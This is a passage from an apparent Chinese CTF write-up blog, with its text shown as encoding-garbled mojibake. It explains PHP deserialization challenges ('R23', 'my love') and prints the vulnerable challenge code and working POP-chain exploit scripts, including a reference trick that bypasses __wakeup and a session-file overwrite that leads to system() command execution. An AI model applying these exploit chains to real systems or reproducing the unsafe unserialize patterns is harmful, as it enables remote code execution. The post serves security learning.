text"><br>ç›´æ¥è®©å…¶è®¿é—®<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://xxx.xxx.xxx.xxx:8000</span><br></pre></td></tr></table></figure><br>å³å¯å¾—åˆ°flag</p><h1 id="R23"><a href="#R23" class="headerlink" title="R23"></a>R23</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/R:2|R:3/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>éš¾åº¦ä¹Ÿä¸é«˜ï¼Œä¸€ä¸ªååºåˆ—åŒ–ï¼Œåªç¦äº†R:2å’ŒR:3(å’Œæ²¡ç¦ä¸€æ ·)</p><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ˜æ˜¾æ˜¯è¦è§¦å‘xkçš„loveå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦å°è¯•ç»•è¿‡wakeupã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å…ˆè®²ä¸€ä¸‹ä»€ä¹ˆæ˜¯å¼•ç”¨<br>å¦‚ä¸‹ä»£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=&amp;$c</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªå°±ä»£è¡¨äº†<code>$a</code>æ˜¯<code>$c</code>çš„å¼•ç”¨ï¼Œå³ä»–ä»¬æŒ‡å‘åŒä¸€ä¸ªå†…å­˜ï¼Œå³ä»–ä»¬çš„å€¼ä¼šä¸€ç›´ç›¸åŒæ”¹açš„å€¼cä¼šå˜åä¹‹äº¦ç„¶ã€‚<br>é“¾å­å¾ˆçŸ­<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b-&gt;a-&gt;xk</span><br></pre></td></tr></table></figure><br>çœ‹åˆ°è¿™ä¸ªç¬¬ä¸€çœ¼å°±æ„Ÿè§‰å¯ä»¥ä½¿ç”¨å¼•ç”¨æ¥ç»•è¿‡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šå…ˆè°ƒç”¨wakeupç„¶åæ‰ä¼šè°ƒç”¨destruct<code>$a</code>æˆ‘ä»¬çœ‹åˆ°cä¼šè¢«èµ‹å€¼ä¸ºnoé‚£ä¹ˆæˆ‘ä»¬åªè¦ä½¿ç”¨å¼•ç”¨æ±Ÿcè®¾ç½®ä¸ºbçš„å¼•ç”¨ï¼Œé‚£ä¹ˆåœ¨åä¸€å¥å¯¹bçš„èµ‹å€¼æ—¶å°±ä¼šæˆåŠŸå†ä¸€æ¬¡çš„å¯¹cèµ‹å€¼ã€‚è¿™æ ·æˆ‘ä»¬è§¦å‘destructæ—¶cå°±ä¸ºaçš„å€¼æˆ‘ä»¬å¯ä»¥å°†å•Šè®¾ç½®ä¸ºå¯¹è±¡ã€‚<br>expå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=&amp;<span class="variable">$a</span>-&gt;b;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b-&gt;a=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><br>ç”±äºå…¶åªç¦äº†R2R3<br>æˆ‘ä»¬åªè¦åœ¨å±æ€§bå‰é¢å¯¹å¡å‡ ä¸ªå±æ€§ï¼Œå³å¯ä»¥å˜æˆR5R6ä¹‹ç±»çš„åæ­£å±æ€§ä¹Ÿæ²¡ä»€ä¹ˆç”¨</p><h1 id="my-love"><a href="#my-love" class="headerlink" title="my love"></a>my love</h1><p>å“ˆå“ˆè¿™é¢˜å°±æœ‰æ„æ€äº†ï¼Œå†™è¿™é¢˜çš„æ—¶å€™å­¦åˆ°äº†ä¸€äº›å…³äºphp sessionçš„çŸ¥è¯†ã€‚çŸ¥é“äº†phpçš„sessionç«Ÿç„¶æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼è¿›è¡Œå­˜å‚¨çš„ã€‚ä¸‹é¢çš„å­¦ä¹ çš„æ–‡ç« æˆ‘å°±ç›´æ¥è´´å‡ºæ¥äº†ã€‚<a href="https://www.cnblogs.com/ch459742906/p/6078770.html">phpsession</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æ–‡ä»¶åä¸èƒ½æœ‰.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$tmp</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;your are good!&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ‰“å¼€ä¼šå‘ç°å…¶å‘ç”Ÿäº†phpinfoçš„æ³„éœ²ï¼ˆä½†å…¶å®æ²¡è¿™ä¸ªå¿…è¦ä»¥ä¸ºååºåˆ—åŒ–éƒ½å¯ä»¥çœ‹åˆ°çš„ï¼Œç›´æ¥æŠŠé¢˜ç›®é€¼æ ¼ä¸‹ä¸€ä¸ªæ¡£æ¬¡ï¼‰ã€‚é‚£æˆ‘ä»¬èƒ½çœ‹åˆ°ä¿¡æ¯å¯å°±å¤šäº†ã€‚<br>æˆ‘ä»¬å…ˆå®¡è®¡ä¸€ä¸‹è¿™ä¸ªä»£ç ï¼Œè¿˜æ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸»è¦è€ƒç‚¹æ˜¯ä¸€ä¸‹è¿™ä¸²ä»£ç ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$tmp</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;your are good!&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶è¦æ±‚<code>$_GET[&#39;test&#39;]</code>çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸ºN,è€Œåèµ‹å€¼ç»™<code>$tmp</code>ï¼Œæœ€ååˆ¤æ–­<code>$$tmp[&#39;name&#39;]==&#39;your are good!&#39;</code>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å­˜åœ¨å˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬åªè¦å°†<code>$tmp</code>èµ‹å€¼ä¸º_SESSIONé‚£ä¹ˆ<code>$$tmp[name]</code>å°±æ˜¯è¶…å…¨å±€å˜é‡<code>$_SESSION[name]</code>è€Œè¿™ä¸ªå€¼æ—¶å­˜å‚¨åœ¨æ–‡ä»¶é‡Œçš„ï¼Œåªè¦èƒ½å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹é‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹<code>$_SESSION[name]</code>çš„å€¼ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹ååºåˆ—åŒ–çš„éƒ¨åˆ†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æ–‡ä»¶åä¸èƒ½æœ‰.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶å­˜åœ¨ä¸‹é¢ä¸¤ä¸ªç±»<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æ–‡ä»¶åä¸èƒ½æœ‰.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;Â·</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>xkç±»å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶å†™å…¥å‡½æ•°<br>endç±»å¯ä»¥è§¦å‘ä¸€ä¸ªæ— å‚å‡½æ•°ã€‚<br>è€Œè¦å¼€å¯sessionéœ€è¦ä½¿ç”¨session_startå‡½æ•°<br>é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ¥šäº†</p><p>å°±æ˜¯å…ˆååºåˆ—åŒ–è§¦å‘session<em>startå†æŠ“åŒ…æŸ¥çœ‹PHPSESSIDï¼Œç„¶åè§¦å‘æ–‡ä»¶å†™å…¥å‡½æ•°æ¥ä¿®æ”¹sessionæ–‡ä»¶<code>ï¼ˆæ–‡ä»¶å†…å®¹æˆ‘ä»¬å¯ä»¥å†æœ¬åœ°è‡ªå·±å®šä¹‰ä¸€ä¸ª$_SESSION[name]=your are good!ï¼‰</code>ï¼Œsessionæ–‡ä»¶åä¸ºsess</em>åŠ ä¸ŠPHPSESEIDï¼Œä¹‹åå°±æ˜¯å‘tmpä¼ å…¥_SESSIONï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡å‰é¢çš„åˆ¤æ–­è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>ä¸‹é¢æ˜¯ä¸¤ä¸ªpopé“¾çš„æ„é€ expï¼Œæ„é€ éš¾åº¦ä¸é«˜è€ƒç‚¹å’Œä¸Šä¸€é¢˜ä¸€æ ·æˆ‘å°±ä¸è¿‡å¤šèµ˜è¿°äº†<br>è§¦å‘session_start()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 